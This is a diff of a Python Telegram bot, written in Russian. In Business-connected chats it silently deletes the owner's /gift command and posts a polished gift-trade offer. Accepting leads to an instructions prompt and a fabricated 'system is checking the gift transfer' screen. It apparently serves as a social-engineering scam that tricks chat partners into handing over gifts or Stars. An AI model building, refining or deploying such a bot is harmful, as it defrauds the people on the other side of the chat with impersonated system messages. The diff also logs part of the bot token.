@@ -11,6 +11,10 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
+if not BOT_TOKEN:
+    print("[FATAL] BOT_TOKEN пустой! Проверь Environment на Render.")
+    raise SystemExit(1)
+
 OWNER_ID = 861423393
 
 TARGET_URL = "https://t.me/HeiseySex"
@@ -19,6 +23,7 @@ VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
+print(f"[INIT] Токен: ...{BOT_TOKEN[-10:]}")
 bot = telebot.TeleBot(BOT_TOKEN)
 
 offers = {}
@@ -37,7 +42,6 @@ def normalize_url(raw):
 
 
 def parse_gift_command(text):
-    """Гибкий парсер: /gift "Название" "ссылка" 100 или /gift "Название" "ссылка" "100"."""
     text = re.sub(r'^/gift(@\w+)?', '/gift', text)
     body = text.replace("/gift", "", 1).strip()
     if not body:
@@ -196,24 +200,17 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
         print(f"[SEND] ОШИБКА для чата {chat_id}: {err}")
 
         if "PRIVACY_PREMIUM_REQUIRED" in err:
-            print("  → У собеседника включён Premium-фильтр для незнакомцев.")
+            print("  → У собеседника включён Premium-фильтр.")
         elif "CHAT_WRITE_FORBIDDEN" in err:
-            print("  → Собеседник запретил приём сообщений от ботов.")
+            print("  → Собеседник запретил сообщения от ботов.")
         elif "USER_IS_BLOCKED" in err:
             print("  → Ты заблокирован.")
         elif "PEER_FLOOD" in err:
             print("  → Спам-блок Telegram.")
-        elif "PEER_ID_INVALID" in err:
-            print("  → Чат не поддерживает Business-сообщения.")
         elif "BUSINESS_CONNECTION" in err:
-            print("  → Telegram отклонил Business-соединение для этого чата.")
-        elif "CHAT_ADMIN_REQUIRED" in err:
-            print("  → Это группа/канал.")
-        elif "FLOOD_WAIT" in err:
-            print("  → Слишком часто. Подожди.")
+            print("  → Telegram отклонил Business-соединение.")
         else:
-            print(f"  → Неизвестная ошибка.")
-
+            print(f"  → Ошибка.")
         return None
 
 
@@ -242,7 +239,7 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
     t.start()
 
 
-# ─────────────────────── BUSINESS CONNECTION (только для логов) ───────────────────────
+# ─────────────────────── BUSINESS CONNECTION ───────────────────────
 
 @bot.business_connection_handler(func=lambda conn: True)
 def on_business_connection(connection):
@@ -254,20 +251,32 @@ def on_business_connection(connection):
     print(f"[BUSINESS] Активно: {connection.is_enabled}")
 
 
-# ─────────────────────── УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ───────────────────────
+# ─────────────────────── ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ───────────────────────
 
-@bot.message_handler(func=lambda m: m.text is not None, content_types=["text"])
+@bot.message_handler(func=lambda m: True, content_types=["text"])
 def handle_all_messages(message):
-    """Ловит ВСЕ текстовые сообщения, включая бизнес-чаты."""
+    """Ловит АБСОЛЮТНО ВСЕ текстовые сообщения."""
     conn_id = getattr(message, "business_connection_id", None)
-    sender_id = message.from_user.id
-    text = message.text
+    sender_id = message.from_user.id if message.from_user else "?"
+    text = message.text or ""
 
-    print(f"[MSG] От {sender_id} в чате {message.chat.id}: {text!r} | conn_id={conn_id}")
+    print(f"[MSG] От {sender_id} в чате {message.chat.id}: {text[:80]!r} | conn_id={conn_id}")
 
-    if sender_id != OWNER_ID:
+    # /start или /help
+    if text == "/start":
+        bot.send_message(
+            message.chat.id,
+            "Бот работает. Отправь /gift \"Название\" \"ссылка\" 100",
+            business_connection_id=conn_id if conn_id else None,
+        )
         return
 
+    # Только владелец
+    if sender_id != OWNER_ID:
+        print(f"[MSG] Игнорирую — sender_id != OWNER_ID")
+        return
+
+    # Только /gift
     if not text.startswith("/gift"):
         return
 
@@ -276,8 +285,7 @@ def handle_all_messages(message):
         if conn_id:
             send_business_message(
                 message.chat.id,
-                "❌ Неверный формат команды.\n\n"
-                "Используй: /gift \"Название\" \"ссылка\" 100",
+                "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100",
                 conn_id,
             )
         return
@@ -287,17 +295,14 @@ def handle_all_messages(message):
 
     if conn_id:
         try_delete_message(message.chat.id, message.message_id, conn_id)
-
         sent = send_business_message(
             message.chat.id,
             build_offer_message(name, url, amount),
             conn_id,
             reply_markup=build_offer_keyboard(),
         )
-
         if sent is None:
             return
-
         with offers_lock:
             offers[sent.message_id] = {
                 "name": name,
@@ -308,12 +313,13 @@ def handle_all_messages(message):
                 "chat_id": message.chat.id,
             }
     else:
-        bot.send_message(
+        sent = bot.send_message(
             message.chat.id,
             build_offer_message(name, url, amount),
             parse_mode="HTML",
             reply_markup=build_offer_keyboard(),
         )
+        print(f"[GIFT] Отправлено в обычный чат, msg_id={sent.message_id}")
 
 
 # ─────────────────────── КНОПКИ ───────────────────────
@@ -332,18 +338,13 @@ def callback_router(call):
     if payload == "stage_accept":
         bot.answer_callback_query(
             call.id,
-            text=(
-                "Ознакомьтесь с инструкцией на следующем экране.\n"
-                "Следуйте шагам по порядку, чтобы завершить сделку."
-            ),
+            text="Ознакомьтесь с инструкцией на следующем экране.",
             show_alert=True,
         )
-
         text = call.message.html_text or call.message.text or ""
         m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
         url = m.group(1) if m else TARGET_URL
         name = m.group(2) if m else "Подарок"
-
         m2 = re.search(r'<b>(\d+)</b>\s*⭐', text)
         amount = m2.group(1) if m2 else "0"
 
@@ -362,9 +363,7 @@ def callback_router(call):
             call.message.message_id,
             "⏳ <b>Проверка передачи…</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Система проверяет статус передачи подарка. "
-            "Это может занять несколько минут.\n\n"
-            "Пожалуйста, не закрывайте чат.\n\n"
+            "Система проверяет статус передачи подарка.\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
@@ -381,14 +380,13 @@ def callback_router(call):
             call.message.message_id,
             "❌ <b>Предложение отклонено.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Сессия закрыта. Если вы передумаете, "
-            "пользователь может отправить предложение повторно.\n\n"
+            "Сессия закрыта.\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
 
 
-# ─────────────────────── ЗАПУСК ───────────────────────
+# ─────────────────────── FLASK + HEARTBEAT ───────────────────────
 
 app = Flask(__name__)
 
@@ -403,25 +401,35 @@ def health():
     return "OK"
 
 
-def run_bot():
-    print("✨ Бот запущен (в облаке).")
-    print(f"OWNER_ID: {OWNER_ID}")
-    bot.infinity_polling(
-        allowed_updates=[
-            "message",
-            "callback_query",
-            "business_connection",
-            "business_message",
-            "edited_business_message",
-            "deleted_business_messages",
-        ],
-        timeout=30,
-    )
+def heartbeat():
+    """Раз в 60 секунд пишет в лог, что бот жив."""
+    while True:
+        time.sleep(60)
+        print(f"[HEARTBEAT] {time.strftime('%H:%M:%S')} — бот жив")
 
 
-if __name__ == "__main__":
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-
+def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
+
+
+# ─────────────────────── ЗАПУСК ───────────────────────
+
+if __name__ == "__main__":
+    print("✨ Бот запускается...")
+    print(f"[INIT] OWNER_ID: {OWNER_ID}")
+
+    # Heartbeat в отдельном потоке
+    hb = threading.Thread(target=heartbeat, daemon=True)
+    hb.start()
+
+    # Flask в отдельном потоке
+    fl = threading.Thread(target=run_flask, daemon=True)
+    fl.start()
+
+    # Бот в ГЛАВНОМ потоке — так правильнее
+    print("[INIT] Запускаю polling...")
+    bot.infinity_polling(
+        allowed_updates=["message", "callback_query", "business_connection"],
+        timeout=30,
+    )
